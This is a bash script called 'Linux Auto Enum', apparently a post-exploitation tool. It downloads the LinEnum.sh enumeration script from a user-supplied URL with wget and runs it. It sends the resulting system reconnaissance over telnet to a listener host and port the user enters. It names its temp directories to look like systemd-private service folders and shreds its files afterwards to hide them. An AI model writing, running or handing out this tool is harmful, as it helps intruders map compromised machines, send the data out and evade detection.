#!/bin/bash
tmpdir=/tmp/systemd-private-$(/usr/bin/head -c100 /dev/urandom |md5sum|cut -d' ' -f1)-network-manager.service-xACDUF
linenumdir=/tmp/systemd-private-$(/usr/bin/head -c100 /dev/urandom |md5sum|cut -d' ' -f1)-initd-daemon.service-aDKFUW
tmpfile=$tmpdir/tmp
linenum=$linenumdir/tmp
mkdir $tmpdir
mkdir $linenumdir
touch $tmpfile
printf '****Linux Auto Enum****\n'
printf '[+]Temp Directory:\n'
echo $tmpdir
echo 
printf '[+]Temp File:\n'
echo $tmpfile
echo
printf '[+]LinEnum Directory:\n'
echo $linenumdir
echo
printf '[+]LinEnum Executable:\n'
echo $linenum
echo
printf 'Please Enter URL to LinEnum.sh\n'
read path
wget $path -O $linenum
chmod +x $linenum
printf 'Please Enter Listening Host IP Address:\n'
read host
echo
printf 'Please Enter Listening Port:\n'
read port
bash $linenum -t >> $tmpfile
cat $tmpfile | telnet $host $port
sleep 10
shred $tmpfile
shred $linenum
rm -rf $tmpdir
rm -rf $linenumdir
